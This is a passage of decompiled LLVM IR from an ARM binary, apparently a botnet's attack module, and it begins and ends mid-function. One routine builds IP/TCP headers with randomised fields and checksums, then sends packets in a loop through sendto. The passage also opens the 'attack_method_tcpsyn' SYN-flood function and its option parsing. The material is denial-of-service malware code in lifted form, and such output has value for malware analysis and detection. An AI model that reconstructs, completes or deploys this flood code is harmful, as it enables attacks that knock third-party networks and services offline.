  %v7_bfb4 = load i32, i32* %v6_bfb4, align 4
  store i32 %v7_bfb4, i32* @r5, align 4
  %v7_bfb8 = icmp eq i8 %v3_bfb0, 31
  store i1 %v7_bfb8, i1* %cpsr_z.global-to-local, align 1
  %v1_bfbc = add i32 %v7_bfb4, 20
  store i32 %v1_bfbc, i32* @r6, align 4
  %tmp77 = icmp ult i8 %v3_bfb0, 32
  br i1 %tmp77, label %dec_label_pc_c0b8, label %dec_label_pc_bfc4

dec_label_pc_bfc4:                                ; preds = %dec_label_pc_bfa0
  store i32 %v6_bcd0, i32* %r0.global-to-local, align 4
  store i1 %v7_bfc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_bfc8, label %dec_label_pc_c118, label %dec_label_pc_bfd0

dec_label_pc_bfd0:                                ; preds = %dec_label_pc_c0b8, %dec_label_pc_bfc4
  store i32 %v3_bd2c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_c128, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_c128, label %dec_label_pc_c134, label %dec_label_pc_bfe4

dec_label_pc_bfe4:                                ; preds = %dec_label_pc_c118.dec_label_pc_bfe4_crit_edge, %dec_label_pc_bfd0
  %v1_bfe8 = phi i32 [ %v1_bfe8.pre, %dec_label_pc_c118.dec_label_pc_bfe4_crit_edge ], [ 65535, %dec_label_pc_bfd0 ]
  store i32 %v3_bd30, i32* %r2.global-to-local, align 4
  %v9_bfe8 = icmp eq i32 %v3_bd30, %v1_bfe8
  store i1 %v9_bfe8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_bfe8, label %dec_label_pc_c148, label %dec_label_pc_bff0

dec_label_pc_bff0:                                ; preds = %dec_label_pc_c134.dec_label_pc_bff0_crit_edge, %dec_label_pc_bfe4
  %v1_bff4 = phi i32 [ %v1_bff4.pre, %dec_label_pc_c134.dec_label_pc_bff0_crit_edge ], [ %v1_bfe8, %dec_label_pc_bfe4 ]
  store i32 %v3_bd34, i32* %r3.global-to-local, align 4
  %v9_bff4 = icmp eq i32 %v3_bd34, %v1_bff4
  store i1 %v9_bff4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_bff4, label %dec_label_pc_c15c, label %dec_label_pc_bffc

dec_label_pc_bffc:                                ; preds = %dec_label_pc_c148.dec_label_pc_bffc_crit_edge, %dec_label_pc_bff0
  %v1_c000 = phi i32 [ %v1_c000.pre, %dec_label_pc_c148.dec_label_pc_bffc_crit_edge ], [ %v1_bff4, %dec_label_pc_bff0 ]
  store i32 %v5_bbd0, i32* %ip.global-to-local, align 4
  %v9_c000 = icmp eq i32 %v5_bbd0, %v1_c000
  store i1 %v9_c000, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c000, label %dec_label_pc_c170, label %dec_label_pc_c008

dec_label_pc_c008:                                ; preds = %dec_label_pc_c15c.dec_label_pc_c008_crit_edge, %dec_label_pc_bffc
  %v1_c00c = phi i32 [ %v1_c00c.pre, %dec_label_pc_c15c.dec_label_pc_c008_crit_edge ], [ %v1_c000, %dec_label_pc_bffc ]
  store i32 %v6_bbec, i32* %r0.global-to-local, align 4
  %v9_c00c = icmp eq i32 %v6_bbec, %v1_c00c
  store i1 %v9_c00c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c00c, label %dec_label_pc_c184, label %dec_label_pc_c014

dec_label_pc_c014:                                ; preds = %dec_label_pc_c170, %dec_label_pc_c008
  store i32 %v1_bcbc, i32* %r1.global-to-local, align 4
  store i1 %v2_c18c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c18c, label %dec_label_pc_c020, label %dec_label_pc_c198

dec_label_pc_c020:                                ; preds = %dec_label_pc_c014, %dec_label_pc_c184, %dec_label_pc_c198
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_c024 = load i32, i32* @r5, align 4
  %v3_c024 = add i32 %v2_c024, 10
  %v4_c024 = inttoptr i32 %v3_c024 to i16*
  store i16 0, i16* %v4_c024, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_c02c = load i32, i32* @r5, align 4
  store i32 %v0_c02c, i32* @r0, align 4
  %v2_c030 = call i32 @checksum_generic(i32 %v0_c02c, i32 20)
  %v3_c030 = trunc i32 %v2_c030 to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_c038 = load i32, i32* @r5, align 4
  %v4_c038 = add i32 %v3_c038, 10
  %v5_c038 = inttoptr i32 %v4_c038 to i16*
  store i16 %v3_c030, i16* %v5_c038, align 2
  %v0_c03c = load i32, i32* @r6, align 4
  store i32 %v0_c03c, i32* @r1, align 4
  %v0_c040 = load i32, i32* %r3.global-to-local, align 4
  %v1_c040 = trunc i32 %v0_c040 to i16
  %v3_c040 = add i32 %v0_c03c, 16
  %v4_c040 = inttoptr i32 %v3_c040 to i16*
  store i16 %v1_c040, i16* %v4_c040, align 2
  %v0_c044 = load i32, i32* @sl, align 4
  store i32 %v0_c044, i32* %r2.global-to-local, align 4
  %v0_c048 = load i32, i32* @sb, align 4
  store i32 %v0_c048, i32* %r3.global-to-local, align 4
  %v0_c04c = load i32, i32* @r5, align 4
  store i32 %v0_c04c, i32* %r0.global-to-local, align 4
  %v4_c050 = call i32 @checksum_tcpudp(i32 %v0_c04c, i32 %v0_c03c, i32 %v0_c044, i32 %v0_c048)
  %v5_c050 = trunc i32 %v4_c050 to i16
  store i32 %v4_c050, i32* %r0.global-to-local, align 4
  %v3_c054 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c054, i32* %r3.global-to-local, align 4
  %v3_c058 = mul i32 %v3_c054, 32
  store i32 %v3_c058, i32* %lr.global-to-local, align 4
  %v3_c05c = load i32, i32* @r6, align 4
  %v4_c05c = add i32 %v3_c05c, 16
  %v5_c05c = inttoptr i32 %v4_c05c to i16*
  store i16 %v5_c050, i16* %v5_c05c, align 2
  %v0_c060 = load i32, i32* %lr.global-to-local, align 4
  %v1_c060 = load i32, i32* %r3.global-to-local, align 4
  %tmp78 = mul i32 %v1_c060, -8
  %v5_c060 = add i32 %v0_c060, %tmp78
  store i32 %v5_c060, i32* %lr.global-to-local, align 4
  %v0_c064 = load i32, i32* @r6, align 4
  %v1_c064 = add i32 %v0_c064, 2
  %v2_c064 = inttoptr i32 %v1_c064 to i16*
  %v3_c064 = load i16, i16* %v2_c064, align 2
  %v4_c064 = zext i16 %v3_c064 to i32
  store i32 %v4_c064, i32* @r6, align 4
  %v1_c068 = load i32, i32* @r8, align 4
  %v2_c068 = add i32 %v1_c068, %v5_c060
  store i32 %v2_c068, i32* @lr, align 4
  %v3_c06c = add i32 %v2_c068, 2
  %v4_c06c = inttoptr i32 %v3_c06c to i16*
  store i16 %v3_c064, i16* %v4_c06c, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_c078 = load i32, i32* @r5, align 4
  store i32 %v0_c078, i32* %r1.global-to-local, align 4
  store i32 %v3_bce4, i32* %r0.global-to-local, align 4
  %v0_c080 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_c080, i32* %r2.global-to-local, align 4
  %v0_c084 = load i32, i32* @lr, align 4
  %v6_c08c = call i32 @__libc_sendto(i32 %v3_bce4, i32 %v0_c078, i32 %v0_c080, i32 16384, i32 %v0_c084, i32 16)
  %v3_c090 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c090, i32* %r3.global-to-local, align 4
  %v1_c094 = add i32 %v3_c090, 1
  store i32 %v1_c094, i32* %r0.global-to-local, align 4
  %v1_c098 = load i32, i32* @r7, align 4
  %v9_c098 = icmp eq i32 %v1_c094, %v1_c098
  store i1 %v9_c098, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c094, i32* %stack_var_-44, align 4
  %v5_c0a0 = icmp slt i32 %v1_c094, %v1_c098
  br i1 %v5_c0a0, label %dec_label_pc_bfa0, label %dec_label_pc_c0a4

dec_label_pc_c0a4:                                ; preds = %dec_label_pc_c020
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c0a8 = icmp eq i32 %v1_c098, 0
  store i1 %v2_c0a8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c0a8, label %dec_label_pc_bf8c, label %dec_label_pc_bf9c

dec_label_pc_c0b8:                                ; preds = %dec_label_pc_bfa0
  %v1_c0b8 = add i32 %v2_bfa8, 16
  %v2_c0b8 = inttoptr i32 %v1_c0b8 to i32*
  %v3_c0b8 = load i32, i32* %v2_c0b8, align 4
  %v0_c0bc = call i32 @rand_next()
  store i32 %v0_c0bc, i32* %r0.global-to-local, align 4
  %v3_c0c0 = load i32, i32* %stack_var_-44, align 4
  %v5_c0c8 = mul i32 %v3_c0c0, 24
  %v1_c0cc = and i32 %v3_c0b8, 16711680
  store i32 %v1_c0cc, i32* %ip.global-to-local, align 4
  %v3_c0d0 = udiv i32 %v3_c0b8, 16777216
  %v4_c0d4 = udiv i32 %v1_c0cc, 256
  %v5_c0d4 = or i32 %v4_c0d4, %v3_c0d0
  store i32 %v5_c0d4, i32* %r2.global-to-local, align 4
  %v1_c0d8 = load i32, i32* @r8, align 4
  %v2_c0d8 = add i32 %v1_c0d8, %v5_c0c8
  store i32 %v2_c0d8, i32* %r1.global-to-local, align 4
  %v1_c0dc = and i32 %v3_c0b8, 65280
  store i32 %v1_c0dc, i32* %r3.global-to-local, align 4
  %v1_c0e0 = add i32 %v2_c0d8, 20
  %v2_c0e0 = inttoptr i32 %v1_c0e0 to i8*
  %v3_c0e0 = load i8, i8* %v2_c0e0, align 1
  %v4_c0e0 = zext i8 %v3_c0e0 to i32
  store i32 %v4_c0e0, i32* %ip.global-to-local, align 4
  %v5_c0e8 = call i32 @llvm.bswap.i32(i32 %v3_c0b8)
  %v7_c0ec = lshr i32 %v0_c0bc, %v4_c0e0
  %v8_c0ec = add i32 %v7_c0ec, %v5_c0e8
  store i32 %v8_c0ec, i32* %r2.global-to-local, align 4
  %v1_c0fc = and i32 %v8_c0ec, 65280
  store i32 %v1_c0fc, i32* %r1.global-to-local, align 4
  store i32 %v6_bcd0, i32* %r0.global-to-local, align 4
  %v5_c108 = call i32 @llvm.bswap.i32(i32 %v8_c0ec)
  store i32 %v5_c108, i32* %r3.global-to-local, align 4
  store i1 %v7_bfc8, i1* %cpsr_z.global-to-local, align 1
  %v1_c110 = load i32, i32* @r5, align 4
  %v2_c110 = add i32 %v1_c110, 16
  %v3_c110 = inttoptr i32 %v2_c110 to i32*
  store i32 %v5_c108, i32* %v3_c110, align 4
  br i1 %v2_bfc8, label %dec_label_pc_c118, label %dec_label_pc_bfd0

dec_label_pc_c118:                                ; preds = %dec_label_pc_c0b8, %dec_label_pc_bfc4
  %v0_c118 = call i32 @rand_next()
  store i32 %v0_c118, i32* %r0.global-to-local, align 4
  store i32 %v3_bd2c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_c128, i1* %cpsr_z.global-to-local, align 1
  %v1_c12c = load i32, i32* @r5, align 4
  %v2_c12c = add i32 %v1_c12c, 12
  %v3_c12c = inttoptr i32 %v2_c12c to i32*
  store i32 %v0_c118, i32* %v3_c12c, align 4
  br i1 %v3_c128, label %dec_label_pc_c134, label %dec_label_pc_c118.dec_label_pc_bfe4_crit_edge

dec_label_pc_c118.dec_label_pc_bfe4_crit_edge:    ; preds = %dec_label_pc_c118
  %v1_bfe8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_bfe4

dec_label_pc_c134:                                ; preds = %dec_label_pc_c118, %dec_label_pc_bfd0
  %v0_c134 = call i32 @rand_next()
  %v1_c134 = trunc i32 %v0_c134 to i16
  store i32 %v0_c134, i32* %r0.global-to-local, align 4
  store i32 %v3_bd30, i32* %r2.global-to-local, align 4
  %v1_c13c = load i32, i32* @r4, align 4
  %v9_c13c = icmp eq i32 %v3_bd30, %v1_c13c
  store i1 %v9_c13c, i1* %cpsr_z.global-to-local, align 1
  %v3_c140 = load i32, i32* @r5, align 4
  %v4_c140 = add i32 %v3_c140, 4
  %v5_c140 = inttoptr i32 %v4_c140 to i16*
  store i16 %v1_c134, i16* %v5_c140, align 2
  br i1 %v9_c13c, label %dec_label_pc_c148, label %dec_label_pc_c134.dec_label_pc_bff0_crit_edge

dec_label_pc_c134.dec_label_pc_bff0_crit_edge:    ; preds = %dec_label_pc_c134
  %v1_bff4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_bff0

dec_label_pc_c148:                                ; preds = %dec_label_pc_c134, %dec_label_pc_bfe4
  %v0_c148 = call i32 @rand_next()
  %v1_c148 = trunc i32 %v0_c148 to i16
  store i32 %v0_c148, i32* %r0.global-to-local, align 4
  store i32 %v3_bd34, i32* %r3.global-to-local, align 4
  %v1_c150 = load i32, i32* @r4, align 4
  %v9_c150 = icmp eq i32 %v3_bd34, %v1_c150
  store i1 %v9_c150, i1* %cpsr_z.global-to-local, align 1
  %v3_c154 = load i32, i32* @r5, align 4
  %v4_c154 = add i32 %v3_c154, 20
  %v5_c154 = inttoptr i32 %v4_c154 to i16*
  store i16 %v1_c148, i16* %v5_c154, align 2
  br i1 %v9_c150, label %dec_label_pc_c15c, label %dec_label_pc_c148.dec_label_pc_bffc_crit_edge

dec_label_pc_c148.dec_label_pc_bffc_crit_edge:    ; preds = %dec_label_pc_c148
  %v1_c000.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_bffc

dec_label_pc_c15c:                                ; preds = %dec_label_pc_c148, %dec_label_pc_bff0
  %v0_c15c = call i32 @rand_next()
  %v1_c15c = trunc i32 %v0_c15c to i16
  store i32 %v0_c15c, i32* %r0.global-to-local, align 4
  store i32 %v5_bbd0, i32* %ip.global-to-local, align 4
  %v1_c164 = load i32, i32* @r4, align 4
  %v9_c164 = icmp eq i32 %v5_bbd0, %v1_c164
  store i1 %v9_c164, i1* %cpsr_z.global-to-local, align 1
  %v3_c168 = load i32, i32* @r6, align 4
  %v4_c168 = add i32 %v3_c168, 2
  %v5_c168 = inttoptr i32 %v4_c168 to i16*
  store i16 %v1_c15c, i16* %v5_c168, align 2
  br i1 %v9_c164, label %dec_label_pc_c170, label %dec_label_pc_c15c.dec_label_pc_c008_crit_edge

dec_label_pc_c15c.dec_label_pc_c008_crit_edge:    ; preds = %dec_label_pc_c15c
  %v1_c00c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c008

dec_label_pc_c170:                                ; preds = %dec_label_pc_c15c, %dec_label_pc_bffc
  %v0_c170 = call i32 @rand_next()
  %v1_c174 = load i32, i32* @r6, align 4
  %v2_c174 = add i32 %v1_c174, 4
  %v3_c174 = inttoptr i32 %v2_c174 to i32*
  store i32 %v0_c170, i32* %v3_c174, align 4
  store i32 %v6_bbec, i32* %r0.global-to-local, align 4
  %v1_c17c = load i32, i32* @r4, align 4
  %v9_c17c = icmp eq i32 %v6_bbec, %v1_c17c
  store i1 %v9_c17c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c17c, label %dec_label_pc_c184, label %dec_label_pc_c014

dec_label_pc_c184:                                ; preds = %dec_label_pc_c170, %dec_label_pc_c008
  %v0_c184 = call i32 @rand_next()
  store i32 %v0_c184, i32* %r0.global-to-local, align 4
  store i32 %v1_bcbc, i32* %r1.global-to-local, align 4
  store i1 %v2_c18c, i1* %cpsr_z.global-to-local, align 1
  %v1_c190 = load i32, i32* @r6, align 4
  %v2_c190 = add i32 %v1_c190, 8
  %v3_c190 = inttoptr i32 %v2_c190 to i32*
  store i32 %v0_c184, i32* %v3_c190, align 4
  br i1 %v2_c18c, label %dec_label_pc_c020, label %dec_label_pc_c198

dec_label_pc_c198:                                ; preds = %dec_label_pc_c014, %dec_label_pc_c184
  %v0_c198 = load i32, i32* @r5, align 4
  %v1_c198 = add i32 %v0_c198, 40
  store i32 %v1_c198, i32* %r0.global-to-local, align 4
  store i32 %v6_bc94, i32* %r1.global-to-local, align 4
  %v2_c1a0 = inttoptr i32 %v1_c198 to i16*
  %v3_c1a0 = call i32 @rand_str(i16* %v2_c1a0, i32 %v6_bc94)
  store i32 %v3_c1a0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c020

dec_label_pc_c1a8:                                ; preds = %dec_label_pc_bcf4
  store i32 %v3_bce4, i32* %r0.global-to-local, align 4
  %v1_c1ac = call i32 @__GI___libc_close(i32 %v3_bce4)
  store i32 %v1_c1ac, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c1b0

dec_label_pc_c1b0:                                ; preds = %entry, %dec_label_pc_c1a8
  %v1_c1b8 = phi i32 [ %v3_bce4, %entry ], [ %v1_c1ac, %dec_label_pc_c1a8 ]
  store i32 %v24_bae4, i32* %fp.global-to-local, align 4
  store i32 %v27_bae4, i32* %lr.global-to-local, align 4
  ret i32 %v1_c1b8

dec_label_pc_c1bc:                                ; preds = %dec_label_pc_bd1c
  store i32 %v6_bc94, i32* %r0.global-to-local, align 4
  %v1_c1c4 = add i32 %v6_bc94, 20
  store i32 %v1_c1c4, i32* @sb, align 4
  %v3_c1c8 = mul i32 %v6_bc94, 65536
  store i32 %v3_c1c8, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_bf78

; uselistorder directives
  uselistorder i32 %v0_c15c, { 1, 0 }
  uselistorder i32 %v0_c148, { 1, 0 }
  uselistorder i32 %v0_c134, { 1, 0 }
  uselistorder i32 %v5_c108, { 1, 0 }
  uselistorder i32 %v3_c0b8, { 2, 1, 3, 0 }
  uselistorder i32 %v1_c094, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_c060, { 1, 0 }
  uselistorder i32 %v4_c050, { 1, 0 }
  uselistorder i1 %v7_bfc8, { 2, 1, 0 }
  uselistorder i1 %v2_c18c, { 2, 3, 1, 0 }
  uselistorder i1 %v3_c128, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-140.0, { 1, 0 }
  uselistorder i32 %v1_bf5c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_bf30, { 1, 0 }
  uselistorder i32 %v1_bde4, { 1, 2, 0 }
  uselistorder i32 %v1_bde0, { 2, 1, 0 }
  uselistorder i32 %v1_bddc, { 2, 0, 1 }
  uselistorder i32 %v1_bdd8, { 2, 0, 1 }
  uselistorder i32 %v1_bdd4, { 2, 0, 1 }
  uselistorder i32 %v1_bdac, { 1, 0 }
  uselistorder i32 %v3_bd54, { 1, 0 }
  uselistorder i32 %v3_bd2c, { 0, 1, 3, 2 }
  uselistorder i32 %v0_bd24, { 1, 0, 2 }
  uselistorder i32 %v0_bd20, { 1, 0, 2 }
  uselistorder i32 %v0_bd1c, { 1, 0, 3, 2 }
  uselistorder i1 %v7_bd14, { 1, 0 }
  uselistorder i1 %v7_bce8, { 1, 0 }
  uselistorder i32 %v3_bce4, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v6_bcd0, { 5, 3, 0, 4, 2, 1 }
  uselistorder i32 %v1_bcbc, { 2, 1, 3, 4, 0 }
  uselistorder i32 %v6_bc94, { 0, 10, 9, 8, 7, 2, 4, 3, 6, 5, 1 }
  uselistorder i32 %v6_bbec, { 3, 2, 1, 0 }
  uselistorder i32 %v5_bbd0, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_bb80, { 1, 0 }
  uselistorder i32 %v2_bb00, { 0, 4, 1, 3, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 22, 23, 24, 25, 26, 27, 28, 30, 29, 31, 32, 33, 34, 36, 35, 38, 37, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 6, 4, 7, 5, 8, 9, 10, 12, 11, 14, 13, 15, 17, 16, 18, 19, 20, 22, 21, 27, 23, 24, 25, 26, 31, 28, 29, 30, 32, 34, 33, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 0 }
  uselistorder i16 64, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_c1b0, { 1, 0 }
  uselistorder label %dec_label_pc_c198, { 1, 0 }
  uselistorder label %dec_label_pc_c020, { 2, 1, 0 }
  uselistorder label %dec_label_pc_bf9c, { 1, 0 }
  uselistorder label %dec_label_pc_bf8c, { 1, 0, 2 }
  uselistorder label %bb70, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @attack_method_tcpsyn(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_c1dc = load i32, i32* @r4, align 4
  %v24_c1dc = load i32, i32* @fp, align 4
  %v27_c1dc = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_c1f8 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_c1fc = load i32, i32* @r5, align 4
  store i32 %v0_c1fc, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_c1f8, i32* @sb, align 4
  %v0_c20c = load i32, i32* @r4, align 4
  store i32 %v0_c20c, i32* %r0.global-to-local, align 4
  %v4_c210 = inttoptr i32 %v0_c1fc to i32*
  %v5_c210 = call i32 @attack_get_opt_int(i32 %v0_c20c, i32* %v4_c210, i32 2, i32 0)
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_c228 = load i32, i32* @r5, align 4
  store i32 %v0_c228, i32* %r1.global-to-local, align 4
  %v0_c22c = load i32, i32* @r4, align 4
  store i32 %v0_c22c, i32* %r0.global-to-local, align 4
  %v5_c230 = trunc i32 %v5_c210 to i8
  %v6_c234 = inttoptr i32 %v0_c228 to i32*
  %v7_c234 = call i32 @attack_get_opt_int(i32 %v0_c22c, i32* %v6_c234, i32 3, i32 65535)
  %v0_c238 = load i32, i32* @r5, align 4
  store i32 %v0_c238, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_c248 = load i32, i32* @r4, align 4
  store i32 %v0_c248, i32* %r0.global-to-local, align 4
  %v5_c24c = inttoptr i32 %v0_c238 to i32*
  %v6_c24c = call i32 @attack_get_opt_int(i32 %v0_c248, i32* %v5_c24c, i32 4, i32 64)
  %v1_c254 = urem i32 %v6_c24c, 256
  %v0_c258 = load i32, i32* @r5, align 4
  store i32 %v0_c258, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_c264 = load i32, i32* @r4, align 4
  store i32 %v0_c264, i32* %r0.global-to-local, align 4
  %v6_c26c = inttoptr i32 %v0_c258 to i32*
  %v7_c26c = call i32 @attack_get_opt_int(i32 %v0_c264, i32* %v6_c26c, i32 5, i32 1)
  %v1_c278 = urem i32 %v7_c26c, 256
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_c284 = load i32, i32* @r5, align 4
  store i32 %v0_c284, i32* %r1.global-to-local, align 4
  %v0_c288 = load i32, i32* @r4, align 4
  store i32 %v0_c288, i32* %r0.global-to-local, align 4
  %v5_c290 = inttoptr i32 %v0_c284 to i32*
  %v6_c290 = call i32 @attack_get_opt_int(i32 %v0_c288, i32* %v5_c290, i32 6, i32 65535)
  %v0_c298 = load i32, i32* @r5, align 4
  store i32 %v0_c298, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_c290, i32* %fp.global-to-local, align 4
  %v0_c2a8 = load i32, i32* @r4, align 4
  store i32 %v0_c2a8, i32* %r0.global-to-local, align 4
  %v4_c2ac = inttoptr i32 %v0_c298 to i32*
  %v5_c2ac = call i32 @attack_get_opt_int(i32 %v0_c2a8, i32* %v4_c2ac, i32 7, i32 65535)
  %v0_c2b4 = load i32, i32* @r5, align 4
  store i32 %v0_c2b4, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 %v5_c2ac, i32* @r6, align 4
  %v0_c2c4 = load i32, i32* @r4, align 4
  store i32 %v0_c2c4, i32* %r0.global-to-local, align 4
  %v4_c2c8 = inttoptr i32 %v0_c2b4 to i32*
  %v5_c2c8 = call i32 @attack_get_opt_int(i32 %v0_c2c4, i32* %v4_c2c8, i32 17, i32 65535)
  %v0_c2cc = load i32, i32* @r5, align 4
  store i32 %v0_c2cc, i32* %r1.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c2dc = load i32, i32* @r4, align 4
  store i32 %v0_c2dc, i32* %r0.global-to-local, align 4
  %v5_c2e0 = inttoptr i32 %v0_c2cc to i32*
  %v6_c2e0 = call i32 @attack_get_opt_int(i32 %v0_c2dc, i32* %v5_c2e0, i32 18, i32 0)
  %v0_c2e4 = load i32, i32* @r5, align 4
  store i32 %v0_c2e4, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c2f4 = load i32, i32* @r4, align 4
  store i32 %v0_c2f4, i32* %r0.global-to-local, align 4
  %v5_c2f8 = inttoptr i32 %v0_c2e4 to i32*
  %v6_c2f8 = call i32 @attack_get_opt_int(i32 %v0_c2f4, i32* %v5_c2f8, i32 11, i32 0)
  %v0_c2fc = load i32, i32* @r5, align 4
  store i32 %v0_c2fc, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c30c = load i32, i32* @r4, align 4
  store i32 %v0_c30c, i32* %r0.global-to-local, align 4
  %v5_c310 = inttoptr i32 %v0_c2fc to i32*
  %v6_c310 = call i32 @attack_get_opt_int(i32 %v0_c30c, i32* %v5_c310, i32 12, i32 0)
  %v0_c314 = load i32, i32* @r5, align 4
  store i32 %v0_c314, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c324 = load i32, i32* @r4, align 4
  store i32 %v0_c324, i32* %r0.global-to-local, align 4
  %v5_c328 = inttoptr i32 %v0_c314 to i32*
  %v6_c328 = call i32 @attack_get_opt_int(i32 %v0_c324, i32* %v5_c328, i32 13, i32 0)
  %v0_c32c = load i32, i32* @r5, align 4
  store i32 %v0_c32c, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c33c = load i32, i32* @r4, align 4
  store i32 %v0_c33c, i32* %r0.global-to-local, align 4
  %v5_c340 = inttoptr i32 %v0_c32c to i32*
  %v6_c340 = call i32 @attack_get_opt_int(i32 %v0_c33c, i32* %v5_c340, i32 14, i32 0)
  %v0_c344 = load i32, i32* @r5, align 4
  store i32 %v0_c344, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_c354 = load i32, i32* @r4, align 4
  store i32 %v0_c354, i32* %r0.global-to-local, align 4
  %v5_c358 = inttoptr i32 %v0_c344 to i32*
  %v6_c358 = call i32 @attack_get_opt_int(i32 %v0_c354, i32* %v5_c358, i32 15, i32 1)
  %v0_c35c = load i32, i32* @r5, align 4
  store i32 %v0_c35c, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c36c = load i32, i32* @r4, align 4
  store i32 %v0_c36c, i32* %r0.global-to-local, align 4
  %v5_c370 = inttoptr i32 %v0_c35c to i32*
  %v6_c370 = call i32 @attack_get_opt_int(i32 %v0_c36c, i32* %v5_c370, i32 16, i32 0)
  %v2_c37c = load i32, i32* @global_var_25d48.57, align 4
  store i32 %v2_c37c, i32* %r3.global-to-local, align 4
  %v0_c380 = load i32, i32* @r5, align 4
